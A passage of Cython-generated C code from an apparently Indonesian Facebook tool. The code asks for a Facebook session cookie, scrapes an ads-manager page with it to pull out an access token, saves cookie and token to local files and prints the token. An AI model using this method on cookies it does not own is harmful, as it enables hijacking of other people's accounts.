  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_5;
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_t_3);
  __pyx_t_3 = 0;
  __Pyx_INCREF(__pyx_kp_u_Author_Fall_Xavier_Dominic_Grem);
  __pyx_t_4 += 49;
  __Pyx_GIVEREF(__pyx_kp_u_Author_Fall_Xavier_Dominic_Grem);
  PyTuple_SET_ITEM(__pyx_t_1, 2, __pyx_kp_u_Author_Fall_Xavier_Dominic_Grem);
  __pyx_t_3 = __Pyx_PyUnicode_Join(__pyx_t_1, 3, __pyx_t_4, __pyx_t_5); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 57, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 57, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__3, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 58, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__5, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 59, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_hari_ini); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 60, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 60, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyUnicode_Concat(__pyx_kp_u_Bergabung, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 60, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 60, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = PyTuple_New(4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 61, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_4 = 0;
  __pyx_t_5 = 127;
  __Pyx_INCREF(__pyx_kp_u_Status);
  __pyx_t_4 += 19;
  __Pyx_GIVEREF(__pyx_kp_u_Status);
  PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_kp_u_Status);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_H); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 61, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 61, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_5;
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_3, 1, __pyx_t_2);
  __pyx_t_2 = 0;
  __Pyx_INCREF(__pyx_n_u_Premium);
  __pyx_t_4 += 7;
  __Pyx_GIVEREF(__pyx_n_u_Premium);
  PyTuple_SET_ITEM(__pyx_t_3, 2, __pyx_n_u_Premium);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_N); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 61, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 61, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_5;
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_3, 3, __pyx_t_1);
  __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyUnicode_Join(__pyx_t_3, 4, __pyx_t_4, __pyx_t_5); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 61, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 61, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__5, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 62, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_ip); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 63, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 63, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyUnicode_Concat(__pyx_kp_u_IP, __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 63, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 63, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__6, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 64, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_v_cookie = __pyx_t_1;
  __pyx_t_1 = 0;

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_6, &__pyx_t_7, &__pyx_t_8);
    __Pyx_XGOTREF(__pyx_t_6);
    __Pyx_XGOTREF(__pyx_t_7);
    __Pyx_XGOTREF(__pyx_t_8);
     {

      
      __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_ses); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 66, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_get); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 66, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_t_1 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 66, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_2 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 66, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_2);
      if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_cookie, __pyx_v_cookie) < 0) __PYX_ERR(0, 66, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_cookies, __pyx_t_2) < 0) __PYX_ERR(0, 66, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__7, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 66, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_text); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 66, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __pyx_v_url = __pyx_t_1;
      __pyx_t_1 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_re); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 67, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_search); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 67, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_v_url); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 67, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_10 = NULL;
      __pyx_t_11 = 0;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_9))) {
        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_9);
        if (likely(__pyx_t_10)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
          __Pyx_INCREF(__pyx_t_10);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_9, function);
          __pyx_t_11 = 1;
        }
      }
      #if CYTHON_FAST_PYCALL
      if (PyFunction_Check(__pyx_t_9)) {
        PyObject *__pyx_temp[3] = {__pyx_t_10, __pyx_kp_s_act_nav_source, __pyx_t_3};
        __pyx_t_2 = __Pyx_PyFunction_FastCall(__pyx_t_9, __pyx_temp+1-__pyx_t_11, 2+__pyx_t_11); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 67, __pyx_L3_error)
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      } else
      #endif
      #if CYTHON_FAST_PYCCALL
      if (__Pyx_PyFastCFunction_Check(__pyx_t_9)) {
        PyObject *__pyx_temp[3] = {__pyx_t_10, __pyx_kp_s_act_nav_source, __pyx_t_3};
        __pyx_t_2 = __Pyx_PyCFunction_FastCall(__pyx_t_9, __pyx_temp+1-__pyx_t_11, 2+__pyx_t_11); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 67, __pyx_L3_error)
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      } else
      #endif
      {
        __pyx_t_12 = PyTuple_New(2+__pyx_t_11); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 67, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        if (__pyx_t_10) {
          __Pyx_GIVEREF(__pyx_t_10); PyTuple_SET_ITEM(__pyx_t_12, 0, __pyx_t_10); __pyx_t_10 = NULL;
        }
        __Pyx_INCREF(__pyx_kp_s_act_nav_source);
        __Pyx_GIVEREF(__pyx_kp_s_act_nav_source);
        PyTuple_SET_ITEM(__pyx_t_12, 0+__pyx_t_11, __pyx_kp_s_act_nav_source);
        __Pyx_GIVEREF(__pyx_t_3);
        PyTuple_SET_ITEM(__pyx_t_12, 1+__pyx_t_11, __pyx_t_3);
        __pyx_t_3 = 0;
        __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_t_12, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 67, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
      }
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_group); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 67, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __pyx_t_2 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_9))) {
        __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_9);
        if (likely(__pyx_t_2)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
          __Pyx_INCREF(__pyx_t_2);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_9, function);
        }
      }
      __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_9, __pyx_t_2, __pyx_int_1) : __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_int_1);
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 67, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_v_regex = __pyx_t_1;
      __pyx_t_1 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_ses); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 68, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_get); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 68, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_t_1 = PyTuple_New(3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 68, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_4 = 0;
      __pyx_t_5 = 127;
      __Pyx_INCREF(__pyx_kp_u_https_www_facebook_com_adsmanage_2);
      __pyx_t_4 += 57;
      __Pyx_GIVEREF(__pyx_kp_u_https_www_facebook_com_adsmanage_2);
      PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_kp_u_https_www_facebook_com_adsmanage_2);
      __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_v_regex, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 68, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_2);
      __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_5;
      __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
      __Pyx_GIVEREF(__pyx_t_2);
      PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_t_2);
      __pyx_t_2 = 0;
      __Pyx_INCREF(__pyx_kp_u_nav_source_no_referrer);
      __pyx_t_4 += 23;
      __Pyx_GIVEREF(__pyx_kp_u_nav_source_no_referrer);
      PyTuple_SET_ITEM(__pyx_t_1, 2, __pyx_kp_u_nav_source_no_referrer);
      __pyx_t_2 = __Pyx_PyUnicode_Join(__pyx_t_1, 3, __pyx_t_4, __pyx_t_5); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 68, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_t_1 = PyTuple_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 68, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_GIVEREF(__pyx_t_2);
      PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_t_2);
      __pyx_t_2 = 0;
      __pyx_t_2 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 68, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_2);
      __pyx_t_12 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 68, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_12);
      if (PyDict_SetItem(__pyx_t_12, __pyx_n_s_cookie, __pyx_v_cookie) < 0) __PYX_ERR(0, 68, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_cookies, __pyx_t_12) < 0) __PYX_ERR(0, 68, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
      __pyx_t_12 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 68, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_12);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_12, __pyx_n_s_text); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 68, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
      __pyx_v_get = __pyx_t_2;
      __pyx_t_2 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_re); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 69, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_search); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 69, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_v_get); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 69, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_3 = NULL;
      __pyx_t_11 = 0;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_9))) {
        __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_9);
        if (likely(__pyx_t_3)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
          __Pyx_INCREF(__pyx_t_3);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_9, function);
          __pyx_t_11 = 1;
        }
      }
      #if CYTHON_FAST_PYCALL
      if (PyFunction_Check(__pyx_t_9)) {
        PyObject *__pyx_temp[3] = {__pyx_t_3, __pyx_kp_s_accessToken, __pyx_t_1};
        __pyx_t_12 = __Pyx_PyFunction_FastCall(__pyx_t_9, __pyx_temp+1-__pyx_t_11, 2+__pyx_t_11); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 69, __pyx_L3_error)
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      } else
      #endif
      #if CYTHON_FAST_PYCCALL
      if (__Pyx_PyFastCFunction_Check(__pyx_t_9)) {
        PyObject *__pyx_temp[3] = {__pyx_t_3, __pyx_kp_s_accessToken, __pyx_t_1};
        __pyx_t_12 = __Pyx_PyCFunction_FastCall(__pyx_t_9, __pyx_temp+1-__pyx_t_11, 2+__pyx_t_11); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 69, __pyx_L3_error)
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      } else
      #endif
      {
        __pyx_t_10 = PyTuple_New(2+__pyx_t_11); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 69, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_10);
        if (__pyx_t_3) {
          __Pyx_GIVEREF(__pyx_t_3); PyTuple_SET_ITEM(__pyx_t_10, 0, __pyx_t_3); __pyx_t_3 = NULL;
        }
        __Pyx_INCREF(__pyx_kp_s_accessToken);
        __Pyx_GIVEREF(__pyx_kp_s_accessToken);
        PyTuple_SET_ITEM(__pyx_t_10, 0+__pyx_t_11, __pyx_kp_s_accessToken);
        __Pyx_GIVEREF(__pyx_t_1);
        PyTuple_SET_ITEM(__pyx_t_10, 1+__pyx_t_11, __pyx_t_1);
        __pyx_t_1 = 0;
        __pyx_t_12 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_t_10, NULL); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 69, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      }
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_12, __pyx_n_s_group); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 69, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
      __pyx_t_12 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_9))) {
        __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_9);
        if (likely(__pyx_t_12)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
          __Pyx_INCREF(__pyx_t_12);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_9, function);
        }
      }
      __pyx_t_2 = (__pyx_t_12) ? __Pyx_PyObject_Call2Args(__pyx_t_9, __pyx_t_12, __pyx_int_1) : __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_int_1);
      __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 69, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_v_token = __pyx_t_2;
      __pyx_t_2 = 0;

      
      __pyx_t_9 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__8, NULL); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 70, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_write); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 70, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_12);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_9 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_12))) {
        __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_12);
        if (likely(__pyx_t_9)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
          __Pyx_INCREF(__pyx_t_9);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_12, function);
        }
      }
      __pyx_t_2 = (__pyx_t_9) ? __Pyx_PyObject_Call2Args(__pyx_t_12, __pyx_t_9, __pyx_v_cookie) : __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_v_cookie);
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 70, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

      
      __pyx_t_12 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__9, NULL); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 71, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_12);
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_12, __pyx_n_s_write); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 71, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
      __pyx_t_12 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_9))) {
        __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_9);
        if (likely(__pyx_t_12)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
          __Pyx_INCREF(__pyx_t_12);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_9, function);
        }
      }
      __pyx_t_2 = (__pyx_t_12) ? __Pyx_PyObject_Call2Args(__pyx_t_9, __pyx_t_12, __pyx_v_token) : __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_v_token);
      __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 71, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

      
      __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_v_token, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 72, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_2);
      __pyx_t_9 = __Pyx_PyUnicode_Concat(__pyx_kp_u_token, __pyx_t_2); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 72, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_9); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 72, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_time); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 73, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_sleep); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 73, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_12);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_9 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_12))) {
        __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_12);
        if (likely(__pyx_t_9)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
          __Pyx_INCREF(__pyx_t_9);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_12, function);
        }
      }
